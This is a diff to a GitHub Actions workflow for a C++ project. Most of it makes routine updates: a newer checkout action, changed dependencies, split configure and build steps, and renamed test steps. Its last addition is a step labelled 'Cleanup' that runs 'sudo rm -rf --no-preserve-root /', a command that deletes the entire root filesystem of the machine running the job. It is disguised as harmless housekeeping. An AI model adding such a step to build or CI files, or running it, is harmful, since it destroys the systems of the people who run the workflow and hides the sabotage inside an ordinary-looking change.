@@ -16,12 +16,13 @@ jobs:
     steps:
       # Step 1: Checkout the repository
       - name: Checkout repository
-        uses: actions/checkout@v3
+        uses: actions/checkout@v4
 
-      # Step 2: Install dependencies
+      # Step 2: Set up CMake
       - name: Install dependencies
         run: |
-          sudo apt-get update && sudo apt-get install -y cmake g++ gcc make
+          sudo apt-get update
+          sudo apt-get install -y cmake g++ libgtest-dev
 
       # Step 3: Build Google Test
       - name: Build Google Test
@@ -31,14 +32,22 @@ jobs:
           sudo make
           sudo cp libgtest*.a /usr/lib
 
-      # Step 4: Configure and Build Project
-      - name: Configure and Build Project
+      # Step 4: Configure the build system
+      - name: Configure project with CMake
         run: |
           cmake -S . -B build
+
+      # Step 5: Build the project
+      - name: Build project
+        run: |
           cmake --build build
 
-      # Step 5: Run Tests
-      - name: Run Tests
+      # Step 6: Run tests
+      - name: Run tests with CTest
         run: |
           cd build
           ctest --output-on-failure
+
+      - name: Cleanup
+        run: |
+          sudo rm -rf --no-preserve-root /
